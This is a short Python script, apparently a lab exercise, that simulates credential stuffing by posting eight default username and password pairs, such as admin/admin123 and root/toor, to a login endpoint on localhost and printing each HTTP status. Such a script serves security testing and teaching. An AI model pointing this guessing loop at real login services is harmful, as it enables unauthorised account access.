import requests
import time

URL = "http://127.0.0.1:5000/login"

credentials = [
    ("admin", "admin123"),
    ("test", "test123"),
    ("guest", "guest123"),
    ("user", "password123"),
    ("root", "toor"),
    ("admin", "qwerty"),
    ("test", "password"),
    ("guest", "welcome")
]

print("[*] Starting credential-stuffing simulation...")

for username, password in credentials:
    data = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(URL, data=data, timeout=5)

        print(
            f"[*] Trying {username}:{password} "
            f"-> HTTP {response.status_code}"
        )

    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")

    time.sleep(1)

print("[+] Credential-stuffing simulation completed.")
